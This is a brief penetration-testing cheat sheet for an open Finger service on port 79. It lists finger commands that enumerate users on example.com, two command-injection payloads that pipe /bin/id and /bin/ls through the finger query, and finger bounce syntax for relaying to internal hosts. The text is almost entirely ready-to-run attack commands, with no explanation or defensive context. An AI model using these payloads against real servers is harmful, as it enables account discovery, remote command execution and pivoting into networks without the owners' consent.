Finger Port 79 open

    User enumeration
        finger 'a b c d e f g h' @example.com
        finger admin@example.com
        finger user@example.com
        finger 0@example.com
        finger .@example.com
        finger **@example.com
        finger test@example.com
        finger @example.com
    Command execution
        finger "|/bin/id@example.com"
        finger "|/bin/ls -a /@example.com"
    Finger Bounce
        finger user@host@victim
        finger @internal@external
